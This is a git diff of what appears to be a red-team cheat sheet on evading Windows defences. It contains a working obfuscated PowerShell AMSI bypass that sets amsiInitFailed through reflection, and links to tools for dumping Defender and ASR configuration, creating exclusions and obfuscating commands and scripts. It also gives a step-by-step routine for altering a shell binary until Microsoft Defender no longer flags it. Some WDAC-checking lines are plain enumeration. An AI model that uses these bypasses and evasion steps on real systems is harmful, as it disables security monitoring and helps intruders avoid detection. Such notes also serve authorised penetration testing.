@@ -61,6 +61,9 @@ Get-MpPreference | select Exclusion*
 (Get-MpPreference).Exclusionpath
 ```
 
+#### Script to dump MDE config / ASR rules
+- https://github.com/BlackSnufkin/Invoke-DumpMDEConfig?tab=readme-ov-file
+
 #### Create exclusion
 ```
 Set-MpPreference -ExclusionPath "<path>"
@@ -174,7 +177,8 @@ S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{
 ```
 
 ```
-$v=[Ref].Assembly.GetType('System.Management.Automation.Am' + 'siUtils'); $v."Get`Fie`ld"('ams' + 'iInitFailed','NonPublic,Static')."Set`Val`ue"($null,$true)
+$v=[Ref].Assembly.GetType('System.Management.Automation.Am' + 'siUtils');
+$v."Get`Fie`ld"('ams' + 'iInitFailed','NonPublic,Static')."Set`Val`ue"($null,$true);
 ```
 
 #### AMSI bypass string 2 obfuscated
@@ -468,15 +472,28 @@ ls C:\Windows\system32\CodeIntegrity
 - Only works if WDAC isn't enforced through GPO but setup locally!
 
 #### Check for WDAC
+- `SecurityServicesConfigured` and `SecurityServicesRunning` values are:
+  - 0. No services configured/running
+  - 1. If present, Credential Guard is configured/running.
+  - 2. If present, HVCI is configured/running.
+  - 3. If present, System Guard Secure Launch is configured/running.
+  - 4. If present, SMM Firmware Measurement is configured/running.
+
 ```
 Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard
 ```
 
-#### Check for the policy on disk
+#### Check for policies
 - `.p7b` is a signed policy
+- Policies stored in `C:\Windows\System32\CodeIntegrity` either in a Single file `SiPolicy.p7b` or multiple policies in `\CiPolicies`.
 - Check if there are any `.xml` files which didn't got removed with the policy
 ```
 ls C:\Windows\system32\CodeIntegrity
+```
+
+#### Check for readable xml policies
+```
+ls C:\Windows\system32\CodeIntegrity -Recurse -Include *.xml
 ```
 
 ### Code signing
@@ -705,6 +722,10 @@ reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa\RunAsPPL
 #### Go binaries
 - https://github.com/burrowers/garble
 
+#### Command line arguments
+- https://argfuscator.net/
+- Blogpost: https://www.wietzebeukema.nl/blog/bypassing-detections-with-command-line-obfuscation
+
 #### Powershell
 - [https://github.com/danielbohannon/Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation)
 - [https://github.com/JoelGMSec/Invoke-Stealth](https://github.com/JoelGMSec/Invoke-Stealth)
@@ -824,7 +845,9 @@ $v=[Ref].Assembly.GetType('System.Management.Automation.Am' + 'siUtils'); $v."Ge
 ```
 
 ### Defeating Microsoft Defender
-- Use https://github.com/rasta-mouse/ThreatCheck or https://github.com/matterpreter/DefenderCheck
+- Use https://github.com/rasta-mouse/ThreatCheck
+- Or https://github.com/matterpreter/DefenderCheck
+- Or https://github.com/gatariee/gocheck (Supports multiple av's)
 1. Run Threatcheck ```.\ThreatCheck.exe -f .\shell.exe```
 2. Replace string which gets detected.
 3. Recompile and check again!
